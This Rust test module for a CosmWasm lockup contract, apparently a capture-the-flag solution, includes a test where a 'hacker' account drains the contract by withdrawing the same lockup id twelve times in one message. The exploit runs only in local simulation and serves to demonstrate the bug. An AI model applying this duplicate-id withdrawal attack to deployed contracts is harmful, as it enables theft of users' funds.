#[cfg(test)]
pub mod tests {
    use crate::{
        contract::{DENOM, LOCK_PERIOD, MINIMUM_DEPOSIT_AMOUNT},
        msg::{ExecuteMsg, InstantiateMsg, QueryMsg},
        state::Lockup,
    };
    use cosmwasm_std::{coin, Addr, Empty, Uint128};
    use cw_multi_test::{App, Contract, ContractWrapper, Executor};

    pub fn challenge_contract() -> Box<dyn Contract<Empty>> {
        let contract = ContractWrapper::new(
            crate::contract::execute,
            crate::contract::instantiate,
            crate::contract::query,
        );
        Box::new(contract)
    }

    pub const USER: &str = "user";
    pub const ADMIN: &str = "admin";

    pub fn proper_instantiate() -> (App, Addr) {
        let mut app = App::default();
        let cw_template_id = app.store_code(challenge_contract());

        // init contract
        let msg = InstantiateMsg { count: 1i32 };
        let contract_addr = app
            .instantiate_contract(
                cw_template_id,
                Addr::unchecked(ADMIN),
                &msg,
                &[],
                "test",
                None,
            )
            .unwrap();

        // mint funds to contract
        app = mint_tokens(
            app,
            contract_addr.to_string(),
            MINIMUM_DEPOSIT_AMOUNT * Uint128::new(10),
        );

        // mint funds to user
        app = mint_tokens(app, USER.to_string(), MINIMUM_DEPOSIT_AMOUNT);

        // deposit
        let msg = ExecuteMsg::Deposit {};
        let sender = Addr::unchecked(USER);
        app.execute_contract(
            sender.clone(),
            contract_addr.clone(),
            &msg,
            &[coin(MINIMUM_DEPOSIT_AMOUNT.u128(), DENOM)],
        )
        .unwrap();

        // verify no funds
        let balance = app.wrap().query_balance(USER, DENOM).unwrap().amount;
        assert_eq!(balance, Uint128::zero());

        (app, contract_addr)
    }

    pub fn mint_tokens(mut app: App, recipient: String, amount: Uint128) -> App {
        app.sudo(cw_multi_test::SudoMsg::Bank(
            cw_multi_test::BankSudo::Mint {
                to_address: recipient.to_owned(),
                amount: vec![coin(amount.u128(), DENOM)],
            },
        ))
        .unwrap();
        app
    }

    #[test]
    fn basic_flow() {
        let (mut app, contract_addr) = proper_instantiate();

        let sender = Addr::unchecked(USER);

        // test query
        let msg = QueryMsg::GetLockup { id: 1 };
        let lockup: Lockup = app
            .wrap()
            .query_wasm_smart(contract_addr.clone(), &msg)
            .unwrap();
        assert_eq!(lockup.amount, MINIMUM_DEPOSIT_AMOUNT);
        assert_eq!(lockup.owner, sender);

        // fast forward 24 hrs
        app.update_block(|block| {
            block.time = block.time.plus_seconds(LOCK_PERIOD);
        });

        // test withdraw
        let msg = ExecuteMsg::Withdraw { ids: vec![1] };
        app.execute_contract(sender, contract_addr, &msg, &[])
            .unwrap();

        // verify funds received
        let balance = app.wrap().query_balance(USER, DENOM).unwrap().amount;
        assert_eq!(balance, MINIMUM_DEPOSIT_AMOUNT);
    }

    #[test]
    fn theres_so_many() {
        // "user" now has a lockup with id of 1 and amount of Uint128(10000)
        let (mut app, contract_addr) = proper_instantiate();

        // create "hacker"
        let hacker = Addr::unchecked("hacker");
        // mint "hacker" Uint128(10000) coins
        app = mint_tokens(app, hacker.to_string().clone(), Uint128::from(10000u128));
        // "hacker" creates a lockup with their coins (id of 2)
        app.execute_contract(
            hacker.clone(),
            contract_addr.clone(),
            &ExecuteMsg::Deposit {},
            &[coin(MINIMUM_DEPOSIT_AMOUNT.u128(), DENOM)],
        )
        .unwrap();

        // Verify hacker has no funds
        let hacker_balance = app.wrap().query_balance(hacker.to_string(), DENOM).unwrap().amount;
        assert_eq!(hacker_balance, Uint128::zero());

        // Verify lockup exists
        let hacker_lockup: Lockup = app
            .wrap()
            .query_wasm_smart(contract_addr.clone(), &QueryMsg::GetLockup { id: 2 })
            .unwrap();
        assert_eq!(hacker_lockup.amount, MINIMUM_DEPOSIT_AMOUNT);
        assert_eq!(hacker_lockup.owner, hacker);

        // fast forward 24 hrs
        app.update_block(|block| {
            block.time = block.time.plus_seconds(LOCK_PERIOD);
        });

        //~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ EXPLOIT HERE
        // Notice the duplicate ids in Withdraw message
        // 1 for the funds the hacker deposited,
        // 1 for the funds the non-malicious user deposited
        // 10 for the rest of the funds the contract has
        app.execute_contract(
            hacker.clone(),
            contract_addr.clone(),
            &ExecuteMsg::Withdraw { ids: vec![2; 12] },
            &[]
        ).unwrap();

        // Verify hacker has drained contract
        let hacker_balance = app.wrap().query_balance(hacker.to_string(), DENOM).unwrap().amount;
        assert_eq!(hacker_balance, Uint128::from(120000u128));

        // Verify contract has no funds
        let contract_balance = app.wrap().query_balance(contract_addr.to_string(), DENOM).unwrap().amount;
        assert_eq!(contract_balance, Uint128::zero());
    }
    
}
